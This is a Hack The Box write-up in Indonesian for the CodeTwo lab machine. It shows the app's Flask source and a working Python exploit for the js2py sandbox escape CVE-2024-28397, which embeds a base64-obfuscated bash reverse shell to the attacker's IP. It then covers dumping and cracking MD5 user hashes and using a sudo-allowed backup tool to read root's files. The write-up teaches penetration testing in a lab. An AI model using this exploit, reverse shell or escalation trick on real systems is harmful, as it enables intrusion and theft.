@@ -1,0 +1,336 @@
+---
+layout: post
+title: "HTB Writeup – CodeTwo"
+date: 2025-08-22
+image: /assets/machine/codetwo/codetwo.jpg
+tags: [htb, linux]
+excerpt: "CVE-2024-28397 js2py Sandbox Escape"
+---
+
+
+# Recon
+
+## Port Scan
+
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
+|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
+|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
+8000/tcp open  http    Gunicorn 20.0.4
+|_http-title: Welcome to CodeTwo
+|_http-server-header: gunicorn/20.0.4
+Device type: general purpose
+```
+
+Dari hasil diatas kita bisa tau ada dua port yang terbuka, yaitu port SSH (22) dan port http (8000). Lets, check it.
+
+# Web
+
+# Source Code
+
+<center>
+<img src="/assets/machine/codetwo/web.png" class="img-post" />
+</center>
+
+Kita bisa lihat disana ada menu *Download App*, kita click dan akan mendownload sebuah file bernama app.zip, extract lalu kita analisis.
+
+```python
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
+from flask_sqlalchemy import SQLAlchemy
+import hashlib
+import js2py
+import os
+import json
+
+js2py.disable_pyimport()
+app = Flask(__name__)
+app.secret_key = 'S3cr3tK3yC0d3Tw0'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+db = SQLAlchemy(app)
+
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(80), unique=True, nullable=False)
+    password_hash = db.Column(db.String(128), nullable=False)
+
+class CodeSnippet(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    code = db.Column(db.Text, nullable=False)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/dashboard')
+def dashboard():
+    if 'user_id' in session:
+        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
+        return render_template('dashboard.html', codes=user_codes)
+    return redirect(url_for('login'))
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        password_hash = hashlib.md5(password.encode()).hexdigest()
+        new_user = User(username=username, password_hash=password_hash)
+        db.session.add(new_user)
+        db.session.commit()
+        return redirect(url_for('login'))
+    return render_template('register.html')
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        password_hash = hashlib.md5(password.encode()).hexdigest()
+        user = User.query.filter_by(username=username, password_hash=password_hash).first()
+        if user:
+            session['user_id'] = user.id
+            session['username'] = username;
+            return redirect(url_for('dashboard'))
+        return "Invalid credentials"
+    return render_template('login.html')
+
+@app.route('/logout')
+def logout():
+    session.pop('user_id', None)
+    return redirect(url_for('index'))
+
+@app.route('/save_code', methods=['POST'])
+def save_code():
+    if 'user_id' in session:
+        code = request.json.get('code')
+        new_code = CodeSnippet(user_id=session['user_id'], code=code)
+        db.session.add(new_code)
+        db.session.commit()
+        return jsonify({"message": "Code saved successfully"})
+    return jsonify({"error": "User not logged in"}), 401
+
+@app.route('/download')
+def download():
+    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)
+
+@app.route('/delete_code/<int:code_id>', methods=['POST'])
+def delete_code(code_id):
+    if 'user_id' in session:
+        code = CodeSnippet.query.get(code_id)
+        if code and code.user_id == session['user_id']:
+            db.session.delete(code)
+            db.session.commit()
+            return jsonify({"message": "Code deleted successfully"})
+        return jsonify({"error": "Code not found"}), 404
+    return jsonify({"error": "User not logged in"}), 401
+
+@app.route('/run_code', methods=['POST'])
+def run_code():
+    try:
+        code = request.json.get('code')
+        result = js2py.eval_js(code)
+        return jsonify({'result': result})
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+if __name__ == '__main__':
+    with app.app_context():
+        db.create_all()
+    app.run(host='0.0.0.0', debug=True)
+```
+
+Disana kita tau bahwa function run_code akan melarikan code ke js2py.eval_js().
+
+# CVE-2024-28397
+
+[js2py sandbox escape](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape) dari refrensi ini kita bisa buat payload untuk mendapatkan shell di mesin target.target
+
+```python
+import requests  
+import json  
+  
+url = 'http://codetwo.htb:8000/run_code'  
+  
+js_code = """  
+let cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQ0NCAwPiYxKSAmCg==|base64 -d|bash";  
+let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;  
+let obj = a(a(a,"__class__"), "__base__");  
+function findpopen(o) {  
+    let result;    for(let i in o.__subclasses__()) {        let item = o.__subclasses__()[i];        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {            return item;        }        if(item.__name__ != "type" && (result = findpopen(item))) {            return result;        }    }}  
+let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();  
+console.log(result);  
+result;  
+"""  
+  
+payload = {"code": js_code}  
+  
+headers = {"Content-Type": "application/json"}  
+  
+r = requests.post(url, data=json.dumps(payload), headers=headers)  
+print(r.text)
+```
+
+<center>
+<img src="/assets/machine/codetwo/revshell.jpg" class="img-post" />
+</center>
+
+Dari gambar diatas ada sebuah folder instance yang isinya adalah user.db, kita bisa masuk menggunakan sqlite lalu dump isi table usernya untuk mendapatkan kredensial.
+
+
+# User
+
+```sqlite
+sqlite> SELECT * FROM user;
+1|marco|649c9d65a206a75f5abe509fe128bce5
+2|app|a97588c0e2fa3a024876339e27aeb42e
+```
+
+Kita crack hash marco diatas dan akan mendapatkan password nya.
+
+Login ssh menggunakan kredensial diatas. 
+
+<center>
+<img src="/assets/machine/codetwo/user.jpg" class="img-post" />
+</center>
+
+Kita mendapatkan user.txt.
+
+# Root
+
+```
+marco@codetwo:~$ sudo -l
+Matching Defaults entries for marco on codetwo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marco may run the following commands on codetwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+```
+
+
+Ada sebuah script bernama npbackup-cli yang dapat di jalankan NOPASSWD, lets check it.
+
+```
+marco@codetwo:~$ cat npbackup.conf 
+conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /home/app/app
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+    repo_opts:
+      repo_password: 
+        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+      retention_policy: {}
+      prune_max_unused: 0
+    prometheus: {}
+    env: {}
+    is_protected: false
+groups:
+  default_group:
+    backup_opts:
+      paths: []
+      source_type:
+      stdin_from_command:
+      stdin_filename:
+      tags: []
+      compression: auto
+      use_fs_snapshot: true
+      ignore_cloud_files: true
+      one_file_system: false
+      priority: low
+      exclude_caches: true
+      excludes_case_ignore: false
+      exclude_files:
+      - excludes/generic_excluded_extensions
+      - excludes/generic_excludes
+      - excludes/windows_excludes
+      - excludes/linux_excludes
+      exclude_patterns: []
+      exclude_files_larger_than:
+      additional_parameters:
+      additional_backup_only_parameters:
+      minimum_backup_size_error: 10 MiB
+      pre_exec_commands: []
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+      post_exec_commands: []
+      post_exec_per_command_timeout: 3600
+      post_exec_failure_is_fatal: false
+      post_exec_execute_even_on_backup_error: true
+      post_backup_housekeeping_percent_chance: 0
+      post_backup_housekeeping_interval: 0
+    repo_opts:
+      repo_password:
+      repo_password_command:
+      minimum_backup_age: 1440
+      upload_speed: 800 Mib
+      download_speed: 0 Mib
+      backend_connections: 0
+      retention_policy:
+        last: 3
+        hourly: 72
+        daily: 30
+        weekly: 4
+        monthly: 12
+        yearly: 3
+        tags: []
+        keep_within: true
+        group_by_host: true
+        group_by_tags: true
+        group_by_paths: false
+        ntp_server:
+      prune_max_unused: 0 B
+      prune_max_repack_size:
+    prometheus:
+      backup_job: ${MACHINE_ID}
+      group: ${MACHINE_GROUP}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+    is_protected: false
+identity:
+  machine_id: ${HOSTNAME}__blw0
+  machine_group:
+global_prometheus:
+  metrics: false
+  instance: ${MACHINE_ID}
+  destination:
+  http_username:
+  http_password:
+  additional_labels: {}
+  no_cert_verify: false
+global_options:
+  auto_upgrade: false
+  auto_upgrade_percent_chance: 5
+  auto_upgrade_interval: 15
+  auto_upgrade_server_url:
+  auto_upgrade_server_username:
+  auto_upgrade_server_password:
+  auto_upgrade_host_identity: ${MACHINE_ID}
+  auto_upgrade_group: ${MACHINE_GROUP}
+```
+
+Kita bisa manipulasi path nya ke arah */root*, lalu kita bisa langsung mendapatkan flag root nya di root.txt, atau bisa juga di arahkan ke path ssh untuk mengambil id_ssh nya user root.
+
+```
+sudo npbackup-cli -c npbackup.conf -b -f
+```
+
+Lalu kita dump root.txt nya.
+
+<center>
+<img src="/assets/machine/codetwo/root.jpg" class="img-post" />
+</center>
+
+Rooted.
